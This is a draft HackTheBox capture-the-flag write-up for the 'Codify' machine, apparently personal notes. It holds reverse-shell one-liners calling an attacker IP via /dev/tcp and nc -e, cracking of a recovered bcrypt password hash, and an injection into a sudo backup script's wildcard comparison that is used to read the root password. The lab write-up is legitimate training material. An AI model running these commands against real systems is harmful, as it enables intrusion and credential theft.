---
title: HTB Codify
author: kei5uke
draft: true
description: Writeup for HTB Codify
tags:
  - linux
  - writeup
---

Nmap

```
nmap 10.129.6.44 -sC -sV -oN nmap.tcp.txt -v

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# HTTP 80

Service lets users to run Node.JS app with VM2 library

![[HTB Codify - image.png]]

---

JS frontend

![[HTB Codify - image 1.png]]

---

White list

![[HTB Codify - image 2.png]]

Feroxbuster

```
200      GET       61l      199w     2665c http://codify.htb/limitations
200      GET      119l      246w     3123c http://codify.htb/editor
200      GET       50l      282w     2921c http://codify.htb/about
200      GET       38l      239w     2269c http://codify.htb/
403      GET        9l       28w      275c http://codify.htb/server-status
200      GET      119l      246w     3123c http://codify.htb/Editor
200      GET       50l      282w     2921c http://codify.htb/About
200      GET       50l      282w     2921c http://codify.htb/ABOUT

500     POST       10l       79w     1172c http://codify.htb/run
403     POST        9l       28w      275c http://codify.htb/server-status
```

Found exploit: https://www.exploit-db.com/exploits/51898

`/bin/bash -i >& /dev/tcp/10.10.14.191/4444 0>&1` does not work

`/bin/bash -c "bash -i >& /dev/tcp/10.10.14.191/4444 0>&1`

![[HTB Codify - image 3.png]]

# Shell

```
/opt/scripts
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

---

Found some internal service script

`svc@codify:/var/www/contact$ cat index.js`

```
// initialize the session
app.use(session({
    secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH',
    resave: false,
    saveUninitialized: true
}));
```

---

Sqlite file

```bash
svc@codify:/var/www/contact$ file tickets.db
file tickets.db
tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
```

```bash
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

`hashcat -m 3200 joshua_hash.txt /usr/share/wordlists/rockyou.txt`

`spongebob1`

---

# Shell as Joshua

![[HTB Codify - image 4.png]]

`sudo -l`

```bash
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

---

Found `mysql-backup.sh`

```
/opt/scripts$ cat mysql-backup.sh
cat mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

`*`  breaks the script

Tested below:

```bash
$(/bin/bash -c 'nc 10.10.14.191 4444 -e /bin/bash') 

* && [[ $(touch /home/joshua/hello) 
```

![[HTB Codify - image 5.png]]

All the command run by user can be seen by `pspy`

`/usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql`

root pass: `kljh12k3jhaskjh12kjh3`

![[HTB Codify - image 6.png]]
